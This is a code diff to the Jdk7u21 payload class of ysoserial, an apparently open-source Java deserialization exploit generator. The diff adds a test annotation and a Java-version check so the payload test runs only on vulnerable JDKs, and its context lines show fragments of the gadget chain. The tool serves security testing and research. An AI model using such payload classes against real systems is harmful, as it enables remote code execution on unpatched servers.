@@ -6,6 +6,7 @@ import java.util.LinkedHashSet;
 
 import javax.xml.transform.Templates;
 
+import ysoserial.PayloadTest;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -52,6 +53,7 @@ LinkedHashSet.readObject()
 
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies()
+@PayloadTest ( precondition = "isApplicableJavaVersion")
 public class Jdk7u21 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
@@ -76,6 +78,21 @@ public class Jdk7u21 implements ObjectPayload<Object> {
 		map.put(zeroHashCodeStr, templates); // swap in real object
 
 		return set;
+	}
+	
+	public static boolean isApplicableJavaVersion() {
+	    String property = System.getProperties().getProperty("java.version");
+	    if ( property == null ) {
+	        return false;
+	    }
+	    String parts[] = property.split("\\.|_|-");;
+	    int major   = Integer.parseInt(parts[1]);
+	    int minor   = Integer.parseInt(parts[2]);
+	    int update  = Integer.parseInt(parts[3]);
+	    if ( major < 7 || (major == 7 && update <= 21) ) {
+	        return true;
+	    }
+	    return false;
 	}
 
 	public static void main(final String[] args) throws Exception {
